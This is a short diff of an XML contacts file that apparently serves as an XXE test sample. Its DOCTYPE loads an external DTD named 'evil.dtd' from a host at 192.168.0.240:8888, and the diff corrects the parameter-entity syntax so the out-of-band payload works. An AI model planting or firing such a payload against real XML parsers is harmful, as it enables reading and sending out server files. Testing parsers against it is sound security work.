@@ -1,8 +1,8 @@
 <?xml version="1.0" encoding="UTF-8"?>
 
-<!DOCTYPE foo [
+<!DOCTYPE contacts [
   <!ENTITY % remote SYSTEM "http://192.168.0.240:8888/evil.dtd">
-  %remote;% param1;
+  %remote;%param1;
 ]>
 <contacts>
     <contact>
@@ -18,4 +18,4 @@
         <email>test@test.com</email>
     </contact>
 </contacts>
- 
+
